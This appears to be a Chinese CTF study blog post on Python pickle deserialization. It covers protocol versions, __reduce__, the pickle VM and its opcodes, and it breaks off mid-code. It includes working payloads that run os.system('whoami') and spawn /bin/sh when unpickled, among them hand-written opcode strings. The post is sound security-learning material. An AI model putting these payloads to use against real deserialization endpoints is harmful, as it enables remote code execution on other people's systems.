        <content type="html"><![CDATA[<h2 id="二话不说先宏观理解"><a href="#二话不说先宏观理解" class="headerlink" title="二话不说先宏观理解"></a>二话不说先宏观理解</h2><blockquote><p>FROM java安全漫谈反序列化(1):<br>Python的反序列化过程实际上是在执行一个基于栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序(rce)<br>所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加危险</p></blockquote><ol><li>相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象，这样的话就大大拓宽了我们的攻击面</li></ol><h2 id="pickle库序列化"><a href="#pickle库序列化" class="headerlink" title="pickle库序列化"></a>pickle库序列化</h2><h3 id="不同版本"><a href="#不同版本" class="headerlink" title="不同版本"></a>不同版本</h3><ol><li><p>python为我们提供了两个比较重要的库pickle 和 cpickle，后者是底层使用c语言书写，速度是pickle的1000倍，但是接口相同</p></li><li><p>编写两个脚本</p><ol><li>我们可以看到python3与python2版本序列化出的字符串是不同的，这里<strong>着重python3的</strong></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3版本 vsc运行</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="comment"># 1. 输出序列化</span></span><br><span class="line"><span class="built_in">list</span>=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(<span class="built_in">list</span>,protocol=<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 2. 输入反序列化</span></span><br><span class="line"><span class="comment"># 2. 1 文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/kc1zs4/Code/CTF/Learned/PyPickle/pickleTest_1.pkl&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(<span class="built_in">list</span>,f,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 2. 2 b字符串</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(<span class="string">b&#x27;(lp0\nVa\np1\naVb\np2\naVc\np3\naVd\np4\na.&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># python2版本 python2 ./py2PickleTest.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(<span class="built_in">list</span>,protocol=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/kc1zs4/Code/CTF/Learned/PyPickle/pickleTest_py2_1.pkl&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f: </span><br></pre></td></tr></table></figure></li></ol><h3 id="pickle协议版本与关键函数"><a href="#pickle协议版本与关键函数" class="headerlink" title="pickle协议版本与关键函数"></a>pickle协议版本与关键函数</h3><ol><li><p><a href="https://docs.python.org/zh-cn/3.11/library/pickle.html">极致官方文档</a></p></li><li><p><strong>关于协议</strong></p><ol><li><p>Pickle 协议版本是自动检测出来的，所以不需要参数来指定协议。封存对象以外的其他字节将被忽略</p></li><li><p>pickle协议是向前兼容的，同时python高等级的协议需要越高版本才可以用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新</p><table><thead><tr><th>小小解读</th></tr></thead><tbody><tr><td>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python</td></tr><tr><td>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容</td></tr><tr><td>第 2 版协议是在 Python 2.3 中引入的。 它为 新式类 提供了更高效的封存机制。 请参考 PEP 307 了解第 2 版协议带来的改进的相关信息</td></tr><tr><td>v3 版协议是在 Python 3.0 中引入的。 它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议</td></tr><tr><td>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。它是Python 3.8使用的默认协议。有关第 4 版协议带来改进的信息，请参阅 PEP 3154</td></tr><tr><td>第 5 版协议是在 Python 3.8 中加入的。 它增加了对带外数据的支持，并可加速带内数据处理。 请参阅 PEP 574 了解第 5 版协议所带来的改进的详情</td></tr></tbody></table>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;KC1zs4&#x27;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] pickle v&#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i), pickle.dumps(demo, protocol=i)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不同的表现，看一下，可以认出来</span></span><br><span class="line">[+] pickle v0: <span class="string">b&#x27;cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span></span><br><span class="line">[+] pickle v1: <span class="string">b&#x27;cposix\nsystem\nq\x00(X\x06\x00\x00\x00whoamiq\x01tq\x02Rq\x03.&#x27;</span></span><br><span class="line">[+] pickle v2: <span class="string">b&#x27;\x80\x02cposix\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#x27;</span></span><br><span class="line">[+] pickle v3: <span class="string">b&#x27;\x80\x03cposix\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#x27;</span></span><br><span class="line">[+] pickle v4: <span class="string">b&#x27;\x80\x04\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">[+] pickle v5: <span class="string">b&#x27;\x80\x05\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>在python3中</p><ol><li>在 3.0 版本发生变更: 默认协议版本是 3</li><li>在 3.8 版本发生变更: 默认协议版本是 4</li></ol></li></ol></li><li><p>这里解读关键的函数</p><ol><li>各个有无s的区别在于数据的形式是否为bytes</li></ol><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>dump</td><td>对象反序列化到文件对象并存入文件</td></tr><tr><td>dumps</td><td>对象反序列化为 bytes 对象</td></tr><tr><td>load</td><td>对象反序列化并从文件中读取数据</td></tr><tr><td>loads</td><td>从 bytes 对象反序列化</td></tr></tbody></table> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # # # 1. 序列化对象 # # # # # #</span></span><br><span class="line">    <span class="comment"># 将对象 obj 封存以后的对象写入已打开的 file object file</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># 将 obj 封存以后的对象作为 bytes 类型直接返回，而不是将其写入到文件</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # # 2. 反序列化 # # # # # #</span></span><br><span class="line">    <span class="comment"># 从已打开的 file object 文件 中读取封存后的对象，重建其中特定对象的层次结构并返回</span></span><br><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># 重建并返回一个对象的封存表示形式 data 的对象层级结构。 data 必须为 bytes-like object</span></span><br><span class="line">    <span class="comment"># 这包括所有 bytes、bytearray 和 array.array 对象，以及许多普通 memoryview 对象</span></span><br><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)¶</span><br></pre></td></tr></table></figure></li></ol><h3 id="可操作对象基本规则"><a href="#可操作对象基本规则" class="headerlink" title="可操作对象基本规则"></a>可操作对象基本规则</h3><ol><li><p>列出来</p><ol><li><strong>异常处理</strong>: 异常发生时，可能有部分字节已经被写入指定文件中<ol><li>尝试封存不能被封存的对象会抛出 PicklingError 异常</li><li>超出最大递归层级限制，此时会抛出 RecursionError 异常</li></ol></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">内置常量 (<span class="literal">None</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">Ellipsis</span> 和 <span class="literal">NotImplemented</span>)；</span><br><span class="line"></span><br><span class="line">整数、浮点数、复数;</span><br><span class="line"></span><br><span class="line">字符串、字节串、字节数组;</span><br><span class="line"></span><br><span class="line">只包含可封存对象的元组、列表、集合和字典;</span><br><span class="line"></span><br><span class="line">可在模块最高层级上访问的（内置与用户自定义的）函数（使用 <span class="keyword">def</span>，而不是使用 <span class="keyword">lambda</span> 定义）;</span><br><span class="line"></span><br><span class="line">可在模块最高层级上访问的类;</span><br><span class="line">    这种类的实例调用 __getstate__() 的结果是可 pickle 的（请参阅 封存类实例 一节了解详情）</span><br></pre></td></tr></table></figure></li></ol><h3 id="封存函数与类的实例"><a href="#封存函数与类的实例" class="headerlink" title="*封存函数与类的实例"></a>*封存函数与类的实例</h3><ol><li><p>在python官方文档中有这样两句话</p><blockquote><ol><li>请注意（内置与用户自定义的）函数是按完整 qualified name，而不是按值来封存的。 [2] 这意味着只会封存函数名称，以及包含它的模块和类名称。 函数的代码，以及函数的属性都不会被封存。 因而定义它的模块在解封环境中必须可以被导入，并且模块必须包含所命名的对象，否则将会引发异常。 [3]</li><li>类似地，类也是按完整限定名称来封存的，因此在解封环境中也会应用相同的限制。 请注意类的代码或数据都不会被封存，因此在下面的示例中类属性 attr 不会在解封环境中被恢复<br>进行整理一下</li></ol></blockquote><ol><li>函数封存：<ol><li>pickle会记录函数的完整限定名称，包括函数名、所在的模块名以及如果有的话，所在类的名称。</li><li>函数的实际代码和属性不会被封存。</li><li>在解封时，必须能够从相同的位置（即相同的模块中）找到该函数定义；否则，解封过程将失败。</li></ol></li><li>类封存：<ol><li>类同样按照其完整限定名称进行封存，而不是其内容或状态。</li><li>类的代码及其数据成员不会被封存。注意这里是类的而不是实例的</li><li>如果尝试解封一个类实例，那么在解封环境中也必须可以导入这个类，并且该类需要存在于预期的模块中。任何类级别的属性或方法都不会自动恢复。</li></ol></li><li><strong>总的来说就是</strong><ol><li><strong>函数</strong>: 可以直接理解为只保存了函数的引用，要求在解封时，相应的函数必须能够在当前环境中被找到<ol><li>细节：对象中包含的方法或函数（即类的实例方法、静态方法、类方法等），pickle实际上不会保存这些方法的具体代码。相反，它会保存一个引用，这个引用指向了定义这些方法的类。因此，在反序列化（解封）过程中，pickle假定原来的类定义仍然可用，并且能够通过相同的路径和名称找到它们</li></ol></li><li><strong>类实例</strong>: pickle会保存该实例的状态信息（即实例变量），但不会保存类本身的代码或定义</li><li>并且可封存的函数和类必须在一个模块的最高层级上</li></ol></li></ol></li><li><p>这样一看函数和lambda的路子像是被封死了，这里我们看看可不可以从类下手: <strong>自定义封存&#x2F;解封行为</strong></p><blockquote><ol><li>python中类可以通过提供一个或多个特殊方法来改变<strong>序列化默认行为</strong>，但是都是copy protocol的一部分，具体实现了<code>__reduce__()</code>方法，它提供了一个同一个接口用于检索pickle和复制对象所需的数据</li><li>注意：pickle是在序列化dump()时被调用的，但是在反序列化load()时才触发恶意代码，具体流程看到<strong>pickle进行简单rce那里</strong></li></ol></blockquote><ol><li><code>object.__reduce__()</code><ol><li><strong>参数</strong>: 没有参数</li><li><strong>返回值</strong>: 应该返回一个字符串或者最好是一个元组（返回的对象通常被称为“reduce值”）<ol><li>如果返回一个字符串，则该字符串应被解释为全局变量的名称</li><li>当返回一个元组时，它的长度必须在2到6个元素之间，可选项可以省略，或者可以提供“None”作为其值，这里重点看前两个参数<ol><li>参数1：一个可调用对象，将调用该对象以创建该对象的初始版本</li><li>参数2：可调用对象的参数元组。如果可调用对象不接受任何参数，则必须给出一个空元组</li><li>参数3：可选的，对象的状态，如前所述，它将被传递给对象的__setstate__（）方法。如果对象没有这样的方法，那么该值必须是一个字典，它将被添加到对象的<code>__dict__</code>属性中（其实就是属性值的处理）</li></ol></li></ol></li></ol></li><li><code>object.__reduce_ex__()</code><ol><li>定义：与 <code>__reduce__()</code> 类似，但它接受一个整数参数 protocol，表示使用的 pickle 协议版本。</li><li>返回值：返回值与 <code>__reduce__()</code> 相同，但可以根据协议版本进行不同的处理。</li><li>优先级：如果类同时实现了 <code>__reduce__()</code> 和 <code>__reduce_ex__()</code>，那么 <code>__reduce_ex__()</code> 会覆盖 <code>__reduce__()</code> 的行为。</li></ol></li></ol></li></ol><h2 id="opcode与PVM"><a href="#opcode与PVM" class="headerlink" title="opcode与PVM"></a>opcode与PVM</h2><h3 id="PVM的结构"><a href="#PVM的结构" class="headerlink" title="PVM的结构"></a>PVM的结构</h3><ol><li>PVM就是python虚拟机，用以运行python字节码(Java是JVM)</li><li>由三个部分组成引擎（或者叫指令分析器），栈区、还有一个 Memo （可以称为标签区）<ol><li><img src="/pic/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/pvm_structure.png" alt="结构"></li><li>反序列化开始时，<strong>引擎</strong>从头开始读取流中的操作码和参数，并对其进行解释处理，在这个过程中会<strong>改变栈区和标签区</strong> 直到遇到.这个结束符后停止 处理结束之后会到达栈顶并在栈顶生成反序列化的结果 形成并返回反序列化的对象</li><li><strong>指令处理器</strong>: 从流中读取opcode和参数, 并对其进行解释处理. 重复这个动作, 直到遇到.这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回.</li><li><strong>栈区(stack)</strong>: 由Python的list实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果.</li><li><strong>标签区(memo)</strong>: 是数据的一个索引(标记)，由Python的dict实现, 为PVM的整个生命周期提供存储.</li></ol></li><li>pvm执行流程<ol><li>首先, PVM会把源代码编译成字节码, 字节码是Python语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果Python进程在主机上有写入权限, 那么它会把程序字节码保存为一个以.pyc为扩展名的文件. 如果没有写入权限, 则Python进程会在内存中生成字节码, 在程序执行结束后被自动丢弃</li><li>一般来说, 在构建程序时最好给Python进程在主机上的写入权限, 这样只要源代码没有改变, 生成的.pyc文件就可以被重复利用, 提高执行效率, 同时隐藏源代码.</li><li>然后, Python进程会把编译好的字节码转发到PVM(Python虚拟机)中, PVM会循环迭代执行字节码指令, 直到所有操作被完成.</li></ol></li></ol><h3 id="从例子理解opcode"><a href="#从例子理解opcode" class="headerlink" title="从例子理解opcode"></a>从例子理解opcode</h3><ol><li><p>pickle中的opcode实际上可以看作一种独立的语言(流)，通过对opcode的编写可以进行Python代码执行、覆盖变量等操作。<strong>直接编写的opcode灵活性比使用pickle序列化生成的代码更高</strong>，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）</p></li><li><p><strong>opcode的书写规范</strong></p><ol><li>操作码是单字节的</li><li>带参数的指令用换行符定界(<code>&quot;\n&quot;</code>)</li></ol></li><li><p>这里先描述一下序列化和反序列化的具体过程</p><ol><li><strong>序列化过程</strong><ol><li>从对象提取所有属性，并将属性转化为名值对</li><li>写入对象的类名</li><li>写入名值对</li></ol></li><li><strong>反序列化过程</strong><ol><li>获取 pickle 输入流</li><li>重建属性列表</li><li>根据类名创建一个新的对象</li><li>将属性复制到新的对象中</li></ol></li></ol></li><li><p>这里手搓一个然后重点讲解一些标记</p><blockquote><p>重点的几个opcode，其他的可以在pickle.py中找到<br>S : 后面跟的是字符串，push string; NL-terminated string argument<br>( ：作为命令执行到哪里的一个标记，push special markobject on stack<br>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中，build tuple from topmost stack items<br>c ：定义模块名和类名（模块名和类名之间使用回车分隔），push self.find_class(modname, name); 2 string args<br>o ：与类对象有关，类的实例（即对象），而不是类本身，build &amp; push class instance<br>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中，apply callable to argtuple, both on stack<br>. ：点号是结束符，every pickle ends with STOP</p></blockquote> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># myOpcode.pkl</span></span><br><span class="line">cos         <span class="comment"># c 后面是模块名，换行后是类名,于是将 os.system 放入栈中</span></span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;/bin/sh&#x27;</span> <span class="comment"># ( 这个是标记符，表示元组的开始。它会将当前的栈状态保存到元组栈（metastack）中，并清空当前栈，S 后面是字符串，将 &#x27;/bin/sh&#x27; 压入 stack.</span></span><br><span class="line">tR.         <span class="comment"># t 将 stack 中的值(mark之前的内容即栈前面部分的内容)弹出并转为 tuple, 把 metastack 还原到 stack, 再将 tuple (&#x27;/bin/sh&#x27;,) 压入 stack，同时标记 Mark 消失 </span></span><br><span class="line">            <span class="comment"># R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system(‘/bin/sh’),然后将结果再存入栈中</span></span><br><span class="line">            <span class="comment"># . 结束并返回当前栈顶元素.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># myOpcodeTest.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/kc1zs4/Code/CTF/Learned/PyPickle/myOpcode.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = pickle.load(file)</span><br><span class="line">    <span class="comment"># 成功执行命令</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="进阶：pickle源码中的opcode"><a href="#进阶：pickle源码中的opcode" class="headerlink" title="进阶：pickle源码中的opcode"></a>进阶：pickle源码中的opcode</h3><blockquote><p>查看运作原理可以根据pickle.py中各个opcode的名称查找对应的<code>load_[opcode_name]</code>来查看处理的初步逻辑</p></blockquote><ol><li><p>index</p><ol><li>(: 存入metastack，清空当前栈</li><li>R: 调用当前栈顶两个元素执行回调</li><li>i</li><li>o</li><li>c</li><li>b</li><li>t</li></ol></li><li><p>先总结一下自我的理解</p><ol><li><strong>利用点</strong>: 这里实际上相当于一步一步的命令操作，每一个opcode后对应一个函数操作，有些opcode中包含了可控的回调输入，这就是我们的一个利用点</li><li><strong>过滤</strong>：需要注意到，再序列化字符串中我们的信息是没有进行编码的，opcode只是对应的操作，所以对于黑名单是可以进行过滤的</li><li><strong>运行机制</strong><ol><li>底层实现为一个栈和一个元栈，元栈中保存的是上一片段的信息，栈保存的是这一片段的信息，可以共同实现对数据的切分安排，关键的操作在于stack.append()和metastack.pop()这里，支持嵌套<ol><li><code>i</code>, <code>t</code>有metastack.pop()操作，都粉装再pop_mark()里，故名思意</li><li>pop_mark返回当前栈，并将metastack复原为stack，也就是说当前stack被覆盖了</li></ol></li><li>主要是<strong>对象-参数-调用</strong>驱动，比如o或i或c生成对象，然后使用R或i或者o进行调用，有些是一个操作符做几件事的</li></ol></li></ol></li><li><p><code>load_mark(self)</code>对应<code>&#39;(&#39;</code></p><ol><li>元组开始：( 操作码将当前栈的状态保存到元组栈（metastack）中，并清空当前栈。</li><li>元组结束：当遇到相应的元组结束操作码（通常是 t 或 )）时，会将当前栈中的所有元素组成一个元组，并将其压入栈中。</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_mark</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="variable language_">self</span>.metastack.append(<span class="variable language_">self</span>.stack)</span><br><span class="line">    <span class="variable language_">self</span>.stack = []</span><br><span class="line">    <span class="variable language_">self</span>.append = <span class="variable language_">self</span>.stack.append</span><br><span class="line">dispatch[MARK[<span class="number">0</span>]] = load_mark</span><br></pre></td></tr></table></figure></li><li><p><code>load_reduce</code>对应<code>&#39;R&#39;</code></p><ol><li>可以看到pop()处栈顶元素(也就是一开始最后一个元素，-1对应的)，并将其作为回调函数的参数，回调函数是栈顶倒数第二个元素</li><li>并将调用的结果放到栈顶</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_reduce</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    args = stack.pop()</span><br><span class="line">    func = stack[-<span class="number">1</span>]</span><br><span class="line">    stack[-<span class="number">1</span>] = func(*args)</span><br><span class="line">dispatch[REDUCE[<span class="number">0</span>]] = load_reduce</span><br></pre></td></tr></table></figure></li><li><p><code>load_inst(self)</code>对应<code>i</code></p><ol><li>两行作为module和name，并调用了<code>_instantiate(..)</code>方法通过</li><li><code>_instantiate(..)</code>用于获取一个实例，并会处理对应的参，这里的参数是当前stack的内容</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_inst</span>(<span class="params">self</span>):</span><br><span class="line">    module = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    name = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    klass = <span class="variable language_">self</span>.find_class(module, name)</span><br><span class="line">    <span class="variable language_">self</span>._instantiate(klass, <span class="variable language_">self</span>.pop_mark())</span><br><span class="line">dispatch[INST[<span class="number">0</span>]] = load_inst</span><br><span class="line"></span><br><span class="line"><span class="comment"># Return a list of items pushed in the stack after last MARK instruction.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_mark</span>(<span class="params">self</span>):</span><br><span class="line">    items = <span class="variable language_">self</span>.stack</span><br><span class="line">    <span class="variable language_">self</span>.stack = <span class="variable language_">self</span>.metastack.pop()</span><br><span class="line">    <span class="variable language_">self</span>.append = <span class="variable language_">self</span>.stack.append</span><br><span class="line">    <span class="keyword">return</span> items</span><br></pre></td></tr></table></figure></li><li><p><code>load_obj(self)</code>对应<code>&#39;o&#39;</code></p><ol><li>获取当前stack的东西(pop_mark返回)，其中获取的类cls也在stack中</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_obj</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># Stack is ... markobject classobject arg1 arg2 ...</span></span><br><span class="line">    args = <span class="variable language_">self</span>.pop_mark()</span><br><span class="line">    cls = args.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="variable language_">self</span>._instantiate(cls, args)</span><br><span class="line">dispatch[OBJ[<span class="number">0</span>]] = load_obj</span><br><span class="line"></span><br><span class="line"><span class="string">b&quot;(cos\nsystem\nS&#x27;/bin/sh&#x27;\no.&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><code>load_global(self)</code>对应<code>&#39;c&#39;</code></p><ol><li>会根据模块和name找到对应的cls对象，然后压入栈中</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_global</span>(<span class="params">self</span>):</span><br><span class="line">    module = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    name = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    klass = <span class="variable language_">self</span>.find_class(module, name)</span><br><span class="line">    <span class="variable language_">self</span>.append(klass)</span><br><span class="line">dispatch[GLOBAL[<span class="number">0</span>]] = load_global</span><br></pre></td></tr></table></figure></li><li><p><code>load_build</code>对应<code>&#39;b&#39;</code></p><ol><li>一眼原型链污染(大雾</li><li>这里会对有<code>__setstate__</code>的对象进行调用，这是属性 -&gt; 这里我们如果自己写一个<code>__setstate__​</code>类 构造os.system 和 whoami即可<strong>执行命令</strong></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    state = 